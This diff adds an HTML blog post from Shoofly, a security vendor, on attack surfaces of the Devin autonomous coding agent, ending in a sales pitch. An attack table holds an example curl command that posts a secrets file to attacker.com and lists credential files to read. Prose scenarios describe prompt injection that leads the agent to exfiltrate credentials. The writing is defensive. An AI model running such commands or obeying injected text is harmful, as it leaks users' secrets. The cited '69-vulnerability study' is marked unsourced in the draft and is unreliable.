@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Devin has the mindshare. Cognition's autonomous coding agent is the most talked-about AI developer tool since GitHub Copilot — and for good reason. It can pl..." />
+  <meta name="color-scheme" content="dark" />
+  <meta property="og:title" content="Devin AI Security: What to Know Before Going Autonomous — Shoofly" />
+  <meta property="og:description" content="Devin has the mindshare. Cognition's autonomous coding agent is the most talked-about AI developer tool since GitHub Copilot — and for good reason. It can pl..." />
+  <meta property="og:image" content="https://shoofly.dev/social-card.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://shoofly.dev/blog/devin-ai-security/" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Devin AI Security: What to Know Before Going Autonomous — Shoofly" />
+  <meta name="twitter:description" content="Devin has the mindshare. Cognition's autonomous coding agent is the most talked-about AI developer tool since GitHub Copilot — and for good reason. It can pl..." />
+  <meta name="twitter:image" content="https://shoofly.dev/social-card.png" />
+  <title>Devin AI Security: What to Know Before Going Autonomous — Shoofly</title>
+  <link rel="canonical" href="https://shoofly.dev/blog/devin-ai-security/" />
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="shortcut icon" href="/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #0d1117;
+      --bg-alt: #161b22;
+      --bg-card: #161b22;
+      --border: #30363d;
+      --text: #e6edf3;
+      --text-muted: #8b949e;
+      --accent: #16a34a;
+      --accent-dim: #16a34a33;
+      --font-body: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      --font-mono: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      font-family: var(--font-body);
+      font-size: 1rem;
+      line-height: 1.7;
+      -webkit-font-smoothing: antialiased;
+      padding-top: 56px;
+    }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    .site-nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      background-color: var(--bg-alt);
+      border-bottom: 1px solid var(--border);
+      height: 56px; padding: 0 1.5rem;
+      display: flex; justify-content: space-between; align-items: center;
+    }
+    .nav-logo { font-size: 1.1rem; font-weight: 700; color: var(--accent); text-decoration: none; letter-spacing: -0.01em; white-space: nowrap; }
+    .nav-logo:hover { text-decoration: none; }
+    .nav-hamburger { display: none; flex-direction: column; justify-content: space-between; width: 24px; height: 18px; background: none; border: none; cursor: pointer; padding: 0; }
+    .nav-hamburger span { display: block; height: 2px; background: var(--text); border-radius: 2px; }
+    .nav-links { display: flex; list-style: none; gap: 1.5rem; align-items: center; }
+    .nav-links a { font-size: 0.9rem; font-weight: 500; color: var(--text-muted); text-decoration: none; transition: color 0.15s; }
+    .nav-links a:hover { color: var(--text); }
+    @media (max-width: 768px) {
+      .nav-hamburger { display: flex; }
+      .nav-links { display: none; position: absolute; top: 56px; left: 0; right: 0; background: var(--bg-alt); border-bottom: 1px solid var(--border); flex-direction: column; padding: 1rem 1.5rem; gap: 1rem; }
+      .nav-links.open { display: flex; }
+    }
+    .container { width: 100%; max-width: 720px; margin: 0 auto; padding: 0 1.5rem; }
+    .post-header { padding: 3.5rem 0 2rem; border-bottom: 1px solid var(--border); }
+    .post-meta { display: flex; gap: 1rem; align-items: center; margin-bottom: 1rem; }
+    .post-date { font-size: 0.85rem; color: var(--text-muted); }
+    .post-tag { background: var(--accent-dim); color: var(--accent); padding: 0.15rem 0.5rem; border-radius: 4px; font-size: 0.75rem; font-weight: 500; }
+    .post-header h1 { font-size: clamp(1.75rem, 5vw, 2.5rem); font-weight: 700; letter-spacing: -0.02em; line-height: 1.2; }
+    .post-body { padding: 2.5rem 0 4rem; }
+    .post-body p { margin-bottom: 1.4rem; color: var(--text); font-size: 1.05rem; }
+    .post-body h2 { font-size: 1.3rem; font-weight: 700; margin: 2.5rem 0 1rem; color: var(--text); letter-spacing: -0.01em; }
+    .post-body h3 { font-size: 1.1rem; font-weight: 700; margin: 2rem 0 0.75rem; color: var(--text); }
+    .post-body ul, .post-body ol { margin: 1rem 0 1.4rem 1.5rem; }
+    .post-body li { margin-bottom: 0.4rem; font-size: 1.05rem; }
+    .post-body code { font-family: var(--font-mono); font-size: 0.88em; background: var(--bg-alt); border: 1px solid var(--border); padding: 0.15em 0.4em; border-radius: 3px; }
+    .post-body pre { background: var(--bg-alt); border: 1px solid var(--border); border-radius: 6px; padding: 1.25rem 1.5rem; margin: 1.5rem 0; overflow-x: auto; }
+    .post-body pre code { background: none; border: none; padding: 0; font-size: 0.9rem; }
+    .post-body hr { border: none; border-top: 1px solid var(--border); margin: 2rem 0; }
+    .post-body strong { color: var(--text); font-weight: 600; }
+    .post-body a { color: var(--accent); font-weight: 600; text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .post-body table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; font-size: 0.9rem; }
+    .post-body th { background: var(--bg-alt); border: 1px solid var(--border); padding: 0.6rem 1rem; text-align: left; font-weight: 600; }
+    .post-body td { border: 1px solid var(--border); padding: 0.6rem 1rem; }
+    .post-body tr:nth-child(even) td { background: var(--bg-alt); }
+    .back-link { display: inline-block; margin-bottom: 2rem; font-size: 0.9rem; color: var(--text-muted); }
+    .back-link:hover { color: var(--accent); }
+    .cta-box { background: var(--bg-alt); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem 2rem; margin: 2rem 0; }
+    .cta-box p { margin-bottom: 0; }
+    .footer { border-top: 1px solid var(--border); padding: 2rem 0; margin-top: 2rem; }
+    .footer-inner { display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 1rem; }
+    .footer-copy { color: var(--text-muted); font-size: 0.875rem; }
+    .footer-link { font-size: 0.875rem; color: var(--text-muted); text-decoration: none; }
+    .footer-link:hover { color: var(--accent); }
+    .footer-links { display: flex; gap: 1.5rem; flex-wrap: wrap; }
+  </style>
+  <link rel="sitemap" type="application/xml" href="/sitemap.xml">
+  <link rel="alternate" type="application/rss+xml" title="Shoofly Blog" href="/feed.xml">
+</head>
+<body>
+  <nav class='site-nav'>
+    <a href='/' class='nav-logo'>🪰 Shoofly</a>
+    <button class='nav-hamburger' id='navHamburger' aria-label='Open menu'>
+      <span></span><span></span><span></span>
+    </button>
+    <ul class='nav-links' id='navLinks'>
+      <li><a href='/#pricing'>Shoofly Basic</a></li>
+      <li><a href='/#pricing-advanced'>Shoofly Advanced</a></li>
+      <li><a href='/claude-code-dispatch'>Claude Code FAQs</a></li>
+      <li><a href='/openclaw'>OpenClaw FAQs</a></li>
+      <li><a href='/blog'>Blog</a></li>
+      <li><a href='https://clawhub.ai/wow-leeroy-jenkins05/shoofly-basic' target='_blank' rel='noopener noreferrer'>ClawHub</a></li>
+      <li><a href='https://github.com/shoofly-dev/shoofly' target='_blank' rel='noopener noreferrer'>GitHub</a></li>
+    </ul>
+  </nav>
+
+  <div class="container">
+    <div class="post-header">
+      <div class="post-meta">
+        <time class="post-date" datetime="2026-03-22">March 22, 2026</time>
+        <span class="post-tag">Agent Security</span>
+      </div>
+      <h1>Devin AI Security: What to Know Before Going Autonomous</h1>
+    </div>
+
+    <main class="post-body">
+      <a href="/blog" class="back-link">← Back to Blog</a>
+
+<p>Devin has the mindshare. Cognition's autonomous coding agent is the most talked-about AI developer tool since GitHub Copilot — and for good reason. It can plan, code, test, debug, and deploy across a full development environment. Shell access. Browser access. Editor access. The full stack.</p>
+
+<p>That's also the security problem. An agent with access to your shell, browser, and editor simultaneously has an attack surface that most security architectures weren't designed to handle. And because Devin operates autonomously — often without a human reviewing each action — the window between a bad decision and irreversible damage is effectively zero.</p>
+
+<p>This isn't a hit piece. Cognition has built something genuinely impressive. But impressive capability and thorough security analysis are different things, and Devin has had far more of the former than the latter. Here's what you need to know.</p>
+
+<h2>What Devin Can Access</h2>
+
+<p>To understand Devin's security posture, start with its access model. Devin operates in a cloud-hosted development environment with access to:</p>
+
+<ul>
+<li><strong>Shell</strong> — Full terminal access. Command execution, package installation, system configuration.</li>
+<li><strong>Browser</strong> — Web browsing capability. Can navigate to URLs, interact with web UIs, read page content.</li>
+<li><strong>Editor</strong> — Full code editor access. Read, write, and modify files across the project.</li>
+<li><strong>Filesystem</strong> — Access to the project directory and potentially broader filesystem paths.</li>
+<li><strong>Network</strong> — Outbound network access for package installation, API calls, web browsing, and git operations.</li>
+<li><strong>Git</strong> — Repository access including push, pull, and branch operations.</li>
+</ul>
+
+<p>Each of these is a standard development tool. Together, they create a <strong>compound access surface</strong> that's qualitatively different from any individual tool.</p>
+
+<p>Consider: a coding agent with only editor access can modify files but can't exfiltrate data. An agent with only shell access can run commands but can't browse to phishing sites. An agent with only browser access can navigate the web but can't modify your codebase.</p>
+
+<p>Devin has all three. Simultaneously. Autonomously.</p>
+
+<h3>The Trifecta Attack Surface</h3>
+
+<p>The shell + browser + editor combination creates attack vectors that don't exist with any single tool:</p>
+
+<table>
+<thead><tr><th>Attack Vector</th><th>Required Access</th><th>Example</th></tr></thead>
+<tbody><tr><td>Code exfiltration via network</td><td>Shell + Filesystem</td><td><code>curl -X POST https://attacker.com -d @secrets.env</code></td></tr>
+<tr><td>Credential harvesting</td><td>Shell + Filesystem</td><td>Read <code>.env</code>, <code>~/.ssh/</code>, <code>~/.aws/credentials</code></td></tr>
+<tr><td>Supply chain injection</td><td>Editor + Shell + Git</td><td>Modify dependency, commit, push</td></tr>
+<tr><td>Phishing/social engineering</td><td>Browser + Shell</td><td>Navigate to malicious site, download payload, execute</td></tr>
+<tr><td>Persistence via cron/startup</td><td>Shell + Filesystem</td><td>Install cron job or startup script</td></tr>
+<tr><td>Data exfiltration via browser</td><td>Browser + Filesystem</td><td>Upload files to external service via browser</td></tr>
+</tbody></table>
+
+<p>These aren't theoretical. They're the natural consequence of granting an autonomous agent the same access a human developer has — without the human judgment that prevents most of these actions.</p>
+
+<h2>The 69-Vulnerability Study</h2>
+
+<p>[NEEDS SOURCE — Confirm researcher name(s), publication date, methodology, and publication venue for the 69-vulnerability study on Devin/autonomous coding agents. The following details should be verified against the actual research.]</p>
+
+<p>A security researcher published an analysis identifying <strong>69 distinct vulnerabilities</strong> in autonomous coding agent architectures, with specific analysis of Devin's access model.</p>
+
+<p>[FLAG: Verify the following vulnerability categories against the actual study]</p>
+
+<p>The vulnerabilities spanned several categories:</p>
+
+<ul>
+<li><strong>Prompt injection vectors</strong> — Ways to manipulate the agent's behavior through crafted inputs in code comments, documentation, issue descriptions, or dependency READMEs</li>
+<li><strong>Privilege escalation paths</strong> — Methods by which the agent could expand its access beyond intended boundaries</li>
+<li><strong>Data exposure risks</strong> — Scenarios where sensitive data could be leaked through agent actions</li>
+<li><strong>Supply chain risks</strong> — Vectors for introducing malicious code through agent-managed dependencies</li>
+<li><strong>Authentication bypass</strong> — Methods for circumventing access controls in the agent's environment</li>
+</ul>
+
+<p>[NEEDS SOURCE — Confirm if the study differentiated between vulnerabilities specific to Devin vs. vulnerabilities common to all autonomous coding agents]</p>
+
+<p>The 69-vulnerability figure is significant not because each vulnerability is equally severe, but because it demonstrates the <strong>breadth of attack surface</strong> that emerges when an autonomous agent has compound tool access. Many of these vulnerabilities don't exist in agents with narrower access models.</p>
+
+<h2>Telemetry Exposure</h2>
+
+<p>[FLAG: The following telemetry details should be verified. Specific telemetry collection practices may have changed since initial analysis. Check Cognition's current privacy policy and terms of service before publication.]</p>
+
+<p>Like most cloud-hosted development environments, Devin's infrastructure involves telemetry collection. The security-relevant questions for enterprise users:</p>
+
+<p><strong>What data leaves your environment?</strong></p>
+
+<ul>
+<li>Code context sent to model inference endpoints</li>
+<li>Tool call logs and execution traces</li>
+<li>Project structure and file metadata</li>
+<li>Potentially: code content, environment variables, build outputs</li>
+</ul>
+
+<p>[FLAG: Verify specific data collection scope against Cognition's current privacy policy]</p>
+
+<p><strong>Where does inference happen?</strong></p>
+
+<ul>
+<li>Model inference for Devin occurs on Cognition's infrastructure (or their cloud provider's)</li>
+<li>Code context is transmitted to remote servers for model processing</li>
+</ul>
+
+<p><strong>What are the retention policies?</strong> [FLAG: Verify Cognition's data retention policies for code context, tool call logs, and inference data]</p>
+
+<p>For teams working with proprietary code, regulated data, or sensitive intellectual property, these are questions that need clear answers before deployment. This isn't unique to Devin — it applies to any cloud-hosted AI coding agent. But Devin's broader access model means more data <em>types</em> are potentially exposed.</p>
+
+<p><strong>Credit where it's due:</strong> Cognition has been more transparent than many AI agent providers about their infrastructure. But transparency about architecture isn't the same as third-party security validation, and the difference matters for enterprise security teams.</p>
+
+<h2>Browser + Shell + Editor: The Trifecta Attack Surface</h2>
+
+<p>The compound access model deserves deeper analysis because it creates <strong>emergent risks</strong> — attack vectors that don't exist in any single access channel but emerge from their combination.</p>
+
+<h3>Scenario 1: Prompt Injection via Browsed Content</h3>
+
+<p>Devin can browse the web to research solutions. If a malicious page contains prompt injection in its content (hidden text, manipulated Stack Overflow answers, poisoned documentation), the agent could be redirected to execute arbitrary commands via its shell access.</p>
+
+<p><strong>Attack chain:</strong> Browser (reads malicious content) → Model (processes injection) → Shell (executes attacker's command)</p>
+
+<h3>Scenario 2: Supply Chain via Dependency Installation</h3>
+
+<p>Devin installs packages to resolve dependencies. A typosquatted or compromised package could include post-install scripts that execute with Devin's full shell access.</p>
+
+<p><strong>Attack chain:</strong> Editor (identifies dependency) → Shell (installs package) → Shell (post-install script executes)</p>
+
+<h3>Scenario 3: Credential Exfiltration via Code Commit</h3>
+
+<p>Devin can read environment files and has git push access. A prompt injection could direct the agent to include credential values in a code commit.</p>
+
+<p><strong>Attack chain:</strong> Shell (reads .env) → Editor (embeds values in code) → Shell (git commit && push)</p>
+
+<p>Each of these scenarios requires the combination of access channels. No single channel enables the full attack. This is the fundamental challenge of securing compound-access autonomous agents.</p>
+
+<h2>Mitigations for Devin Users</h2>
+
+<p>If you're using Devin (or evaluating it), here are practical steps to reduce your exposure:</p>
+
+<h3>1. Restrict the Environment</h3>
+
+<ul>
+<li><strong>Remove credentials from the environment.</strong> Don't put <code>.env</code> files, SSH keys, or AWS credentials in Devin's workspace. Use short-lived, scoped tokens instead.</li>
+<li><strong>Limit network egress.</strong> Restrict outbound network access to known-good destinations (package registries, your git remote, approved APIs).</li>
+<li><strong>Separate environments.</strong> Don't run Devin in the same environment as production infrastructure, databases, or sensitive systems.</li>
+</ul>
+
+<h3>2. Review Before Merge</h3>
+
+<ul>
+<li><strong>Never auto-merge Devin PRs.</strong> Every pull request should go through human code review with the same rigor as a junior developer's contributions.</li>
+<li><strong>Check dependencies.</strong> Review any new dependencies Devin introduces. Verify package names, versions, and sources.</li>
+<li><strong>Diff carefully.</strong> Look for unexpected file modifications outside the task scope — config changes, new scripts, modified CI/CD pipelines.</li>
+</ul>
+
+<h3>3. Monitor Agent Activity</h3>
+
+<ul>
+<li><strong>Log every tool call.</strong> Capture shell commands, file modifications, network requests, and browser navigations. You need this for incident response.</li>
+<li><strong>Alert on anomalies.</strong> Set up alerts for unexpected behaviors — network connections to unknown hosts, reads of credential files, modifications outside the project scope.</li>
+<li><strong>Audit regularly.</strong> Review Devin's activity logs weekly. Look for patterns, not just individual events.</li>
+</ul>
+
+<h3>4. Scope the Task</h3>
+
+<ul>
+<li><strong>Narrow the task definition.</strong> Vague tasks ("fix the app") give the agent broad latitude. Specific tasks ("fix the null pointer in auth.py line 42") constrain behavior.</li>
+<li><strong>Set explicit boundaries.</strong> Tell Devin what it should <em>not</em> do, not just what it should do.</li>
+</ul>
+
+<h2>Pre-Execution Security for Autonomous Agents</h2>
+
+<p>The mitigations above are manual. They depend on humans reviewing, monitoring, and constraining agent behavior after the fact. For an agent that's supposed to be <em>autonomous</em>, that partially defeats the purpose.</p>
+
+<p>Pre-execution security addresses this by automating enforcement at the tool-call level:</p>
+
+<ul>
+<li><strong>Every shell command</strong> is evaluated against a policy ruleset before it executes</li>
+<li><strong>Every file operation</strong> is checked for scope violations, credential exposure, and unauthorized modifications</li>
+<li><strong>Every network request</strong> is validated against an allowlist of approved destinations</li>
+<li><strong>Every git operation</strong> is evaluated for scope, authorization, and content</li>
+</ul>
+
+<p>This enforcement happens automatically, on every tool call, without human intervention. It's the security layer that makes autonomy safe — or at least safer.</p>
+
+<p>For autonomous agents like Devin, pre-execution security is more critical than for human-in-the-loop agents. When there's no human reviewing each action, the policy engine <em>is</em> the review. It's the only thing between the agent's decision and irreversible execution.</p>
+
+<p><a href="https://shoofly.dev/advanced">Shoofly Advanced</a> provides pre-execution enforcement for AI coding agents, including agents with compound access models like Devin's. Policy rules evaluate shell commands, file operations, network requests, and git operations — covering the full trifecta attack surface.</p>
+
+<hr>
+
+<p><strong>Going autonomous? Go safe. Shoofly Advanced enforces policy rules on every Devin tool call.</strong> → <a href="https://shoofly.dev/advanced">shoofly.dev/advanced</a></p>
+
+<hr>
+
+<h2>FAQ</h2>
+
+<p><strong>Q: Does Shoofly work with Devin specifically?</strong> Shoofly operates at the tool-call layer, intercepting execution regardless of which agent initiates it. For Devin's cloud-hosted environment, integration depends on the deployment model — contact us for specifics on Devin integration.</p>
+
+<p><strong>Q: Is Devin less secure than other AI coding agents?</strong> Not necessarily less secure — it has a <em>broader attack surface</em> because of its compound access model (shell + browser + editor). Agents with narrower access (editor-only, for example) have fewer attack vectors but also less capability. The security challenge is proportional to the access model.</p>
+
+<p><strong>Q: Should I avoid using Devin?</strong> No. Devin is a powerful tool, and Cognition has invested in safety. The point is that powerful autonomous agents need security infrastructure that matches their capability. Use Devin — with appropriate security controls in place.</p>
+
+<p><strong>Q: What about Devin's built-in safety features?</strong> [FLAG: Verify Devin's current built-in safety features before publication] Cognition has implemented safety measures including sandboxing and access controls. These are valuable baseline protections. Pre-execution security adds an additional enforcement layer that operates at the tool-call level — complementary to Devin's built-in controls.</p>
+
+<p><strong>Q: How does this compare to other autonomous agents like Cursor Agent, Windsurf, or Claude Code?</strong> Each autonomous agent has a different access model and different security properties. The trifecta analysis (shell + browser + editor) applies most directly to agents with compound access. We've covered other agents' security properties in separate posts — see our <a href="https://shoofly.dev/blog/ai-coding-agent-security-full-stack/">AI Coding Agent Security: Full Stack</a> guide.</p>
+
+<hr>
+
+<p><em>Related reading:</em></p>
+
+<ul>
+<li><a href="https://shoofly.dev/blog/ai-coding-agent-security-full-stack/">AI Coding Agent Security: Full Stack</a></li>
+<li><a href="https://shoofly.dev/blog/prompt-injection-blocking-pre-execution-security/">Prompt Injection Blocking: Pre-Execution Security</a></li>
+<li><a href="https://shoofly.dev/ai-agent-security/">AI Agent Security</a></li>
+</ul>
+
+      <hr>
+
+      <div class="cta-box">
+        <p><strong>Ready to secure your AI agents?</strong> <a href="https://shoofly.dev/advanced">Shoofly Advanced</a> provides pre-execution policy enforcement for Claude Code and OpenClaw — 20 threat rules, YAML policy-as-code, 100% local. $5/mo.</p>
+      </div>
+
+    </main>
+  </div>
+
+  <footer class="footer">
+    <div class="container footer-inner">
+      <span class="footer-copy">&copy; 2026 Shoofly</span>
+      <div class="footer-links">
+        <a href="https://github.com/shoofly-dev/shoofly" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub</a>
+        <a href="/openclaw" class="footer-link">OpenClaw</a>
+        <a href="/claude-code-dispatch" class="footer-link">Claude Code</a>
+        <a href="/guides" class="footer-link">Guides</a>
+        <a href="/blog" class="footer-link">Blog</a>
+        <a href="/docs/advanced" class="footer-link">Shoofly Advanced Docs</a>
+        <a href="mailto:support@shoofly.dev" class="footer-link">support@shoofly.dev</a>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    const hamburger = document.getElementById('navHamburger');
+    const navLinks = document.getElementById('navLinks');
+    if (hamburger) hamburger.addEventListener('click', () => navLinks.classList.toggle('open'));
+  </script>
+</body>
+</html>
